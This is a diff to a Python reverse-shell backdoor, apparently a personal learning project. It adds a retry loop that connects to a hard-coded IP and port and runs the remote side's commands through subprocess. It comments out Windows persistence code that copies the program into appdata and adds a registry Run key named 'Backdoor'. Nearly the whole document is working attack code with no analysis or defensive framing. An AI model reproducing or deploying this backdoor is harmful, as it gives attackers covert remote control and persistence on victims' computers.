@@ -3,11 +3,13 @@
 # Date: 01/21/2021 - 1/23/2021
 
 import socket
+from termcolor import colored
 import subprocess 
 import json
 import os
 import base64
 import shutil
+import time
 
 def reliable_send(data):
     jsonData = json.dumps(data.decode())
@@ -21,6 +23,19 @@ def reliable_recv():
             return json.loads(data)
         except ValueError:
             continue
+
+def connection():
+    while True:
+        time.sleep(5)
+        try:
+            sock.connect(("192.168.7.125", 54321))
+            print(colored("[+] Connection Established!", "green"))
+            shell()
+            sock.close()
+            break
+        except:
+            print(colored("[-] Unable to restablish connection. Re-trying...", "red"))
+            connection()
 
 def shell():
     while True:
@@ -44,13 +59,10 @@ def shell():
             result = proc.stdout.read() + proc.stderr.read()
             reliable_send(result)
 
-location = os.envrion["appdata"] + "\\windows32.exe"
-if not os.path.exists(location):
-    shutil.copyfile(sys.executable,location)
-    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
-
-
+#location = os.environ["appdata"] + "\\windows32.exe"
+#if not os.path.exists(location):
+ #   shutil.copyfile(sys.executable,location)
+ #   subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(("192.168.7.125", 54321))
-shell()
+connection()
 sock.close()
